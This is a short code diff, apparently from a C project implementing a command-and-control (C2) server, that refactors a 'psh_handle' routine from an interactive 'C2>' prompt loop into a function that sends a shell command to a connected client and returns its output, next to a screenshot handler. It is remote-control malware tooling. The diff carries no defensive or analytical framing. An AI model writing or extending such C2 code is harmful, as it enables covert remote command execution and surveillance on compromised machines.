@@ -67,27 +67,15 @@ char* client_info(sock_t client_fd) {
     return client_info;
 }
 
-// APIs for handling main features, server must semd payload first to initiate the exchange
-void psh_handle(sock_t client_fd) {
-    char buf[C2_BUF_SIZE];
-    while (1) {
-        printf("\nC2> ");
-        fflush(stdout);
-        if (!fgets(buf, C2_BUF_SIZE, stdin)) break;
-        buf[strcspn(buf, "\n")] = 0;
+char* psh_handle(sock_t client_fd, char* cmd) {
+    if (!cmd) return NULL;
 
-        if (strcmp(buf, "quit") == 0) {
-            printf("Session ended.\n");
-            break;
-        }
+    // Send command payload to client
+    if (safe_send(client_fd, cmd, PSH_CMD, strlen(cmd) + 1, 0) <= 0) return NULL;
 
-        if (safe_send(client_fd, buf, PSH_CMD, strlen(buf) + 1, 0) <= 0) break;
-        
-        char* cmd_output = (char*)safe_recv(client_fd, NULL, NULL, 0);
-        if (cmd_output) printf("%s\n", cmd_output);
-        free(cmd_output);
-    }
-    return;
+    // Receive command output from client (allocated by safe_recv)
+    char* cmd_output = (char*)safe_recv(client_fd, NULL, NULL, 0);
+    return cmd_output; // may be NULL on failure
 }
 
 void screenshot_handle(sock_t client_fd) {
